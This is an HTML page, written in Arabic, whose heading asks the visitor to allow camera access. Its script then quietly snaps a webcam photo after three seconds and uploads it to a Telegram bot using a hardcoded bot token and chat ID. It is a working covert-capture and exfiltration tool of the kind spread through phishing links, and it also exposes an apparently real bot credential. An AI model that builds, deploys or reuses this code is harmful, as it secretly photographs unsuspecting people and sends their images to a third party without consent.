<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>التقاط صورة وإرسالها لتليجرام</title>
</head>
<body style="text-align:center; padding-top:50px; background:#111; color:#0f0;">
  <h2>يرجى السماح باستخدام الكاميرا</h2>
  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const botToken = '8076106210:AAFdpz2hPOW8KqgKuk9xdIa7ZVyci6UPQe4
'; // ضع توكن البوت هنا
    const chatId = '1702324511';     // ضع Chat ID هنا

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    window.onload = function () {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.style.display = 'block';

          // انتظر 3 ثوانٍ ثم التقط صورة
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageDataUrl = canvas.toDataURL('image/png');
            sendToTelegram(imageDataUrl);
          }, 3000);
        })
        .catch(error => {
          console.error("حدث خطأ في الوصول إلى الكاميرا:", error);
        });
    };

    function sendToTelegram(imageDataUrl) {
      fetch(imageDataUrl)
        .then(res => res.blob())
        .then(blob => {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'photo.png');

          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            console.log("تم إرسال الصورة إلى تيليجرام:", data);
          })
          .catch(error => {
            console.error("فشل إرسال الصورة:", error);
          });
        });
    }
  </script>
</body>
</html>
